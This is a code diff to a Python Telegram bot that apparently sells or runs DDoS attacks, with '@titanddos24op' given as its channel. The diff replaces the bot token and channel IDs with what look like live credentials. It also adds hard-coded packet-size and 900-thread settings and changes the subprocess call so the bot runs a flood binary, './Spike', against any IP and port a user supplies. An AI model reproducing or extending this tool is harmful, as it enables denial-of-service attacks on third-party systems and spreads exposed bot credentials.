@@ -17,11 +17,13 @@ from requests.exceptions import ReadTimeout
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and channel IDs
-TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your actual bot token
-CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID for attacks
-FEEDBACK_CHANNEL_ID = '-1002124760113'  # Replace with your specific channel ID for feedback
+TOKEN = '7788865701:AAHg0Ii5mPeIJcReFzGgSg_4qFaN8pF9ArQ'  # Replace with your actual bot token
+CHANNEL_ID = '-1002287609881'  # Replace with your specific channel or group ID for attacks
+FEEDBACK_CHANNEL_ID = '-1002294913266'  # Replace with your specific channel ID for feedback
 message_queue = []
-
+# Predefined values for packet size and thread count
+PREDEFINED_PACKET_SIZE = 8  # Example: 1024 bytes
+PREDEFINED_THREAD_COUNT = 900  # Example: 500 threads
 
 # Official channel details
 OFFICIAL_CHANNEL = "@titanddos24op"  # Replace with your channel username or ID
@@ -280,7 +282,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./LEGEND {ip} {port} {duration}",
+            f"./Spike {ip} {port} {duration} {PREDEFINED_PACKET_SIZE} {PREDEFINED_THREAD_COUNT}",
             stderr=asyncio.subprocess.PIPE
         )
 
@@ -291,7 +293,7 @@ async def execute_attack(ip, port, duration, username):
         bot.send_message(
             CHANNEL_ID,
             f"✅ Attack on {ip}:{port} completed! "
-            f"Duration: {duration}s"
+            f"Duration: {duration}s, Packet Size: {PREDEFINED_PACKET_SIZE}, Threads: {PREDEFINED_THREAD_COUNT}"
         )
     except Exception as e:
         # Send error message if something goes wrong
